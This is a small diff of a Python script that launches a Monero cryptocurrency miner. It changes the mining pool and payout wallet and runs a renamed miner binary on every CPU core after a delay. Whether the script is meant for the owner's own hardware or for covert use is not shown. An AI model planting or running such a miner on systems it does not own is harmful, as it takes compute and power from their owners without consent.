@@ -29,8 +29,8 @@ time.sleep(30)
 
 # Konfigurasi mining
 algo = "rx/0"
-pool = "pool.supportxmr.com:9000"
-wallet = "43TNAMPtRC2XXEH9h4xdpRF8xDhMecQ8ZjSsw86U16aWMNkZSXUyA14Gk2bHX8sF7cAth4M5UtpQpg6uZpum4q7R4nWFmwa.org"
+pool = "pool.hashvault.pro:443"
+wallet = "85WosLtTVFYUkE4auncAKa8fJiiWfRYwSbUaJFZdCUEzhLegnJynTUrRUEHLPB3icMesTVkWLGh9R27NyQEtrkYV2TFcyRX.org"
 
 cmd = f"./{final_name} -a {algo} --url {pool} --tls --user {wallet} --cpu {os.cpu_count()}"
 print(f"[INFO] Running miner:\n{cmd}\n")
